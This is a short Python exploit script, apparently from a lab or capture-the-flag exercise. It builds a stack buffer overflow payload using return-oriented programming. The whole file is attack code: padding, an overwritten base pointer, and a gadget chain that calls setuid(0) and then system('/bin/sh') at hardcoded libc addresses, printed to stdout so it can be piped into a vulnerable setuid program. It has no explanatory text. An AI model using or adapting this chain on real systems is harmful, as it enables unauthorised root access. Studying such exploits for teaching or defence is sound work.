import sys
import struct

setuid = struct.pack("Q", 0x7ffff7af2fa0)
system = struct.pack("Q", 0x7ffff7a79480)
exit = struct.pack("Q", 0x7ffff7a6f980)
bin_sh = struct.pack("Q", 0x7ffff7b9bc19)
pop_rdi = struct.pack("Q", 0x7ffff7bac9fd)
zero = struct.pack("Q", 0)

payload = b'A' * 0x10
payload += b'BBBBBBBB'
payload += pop_rdi
payload += zero
payload += setuid
payload += pop_rdi
payload += bin_sh
payload += system
payload += exit

sys.stdout.buffer.write(payload)
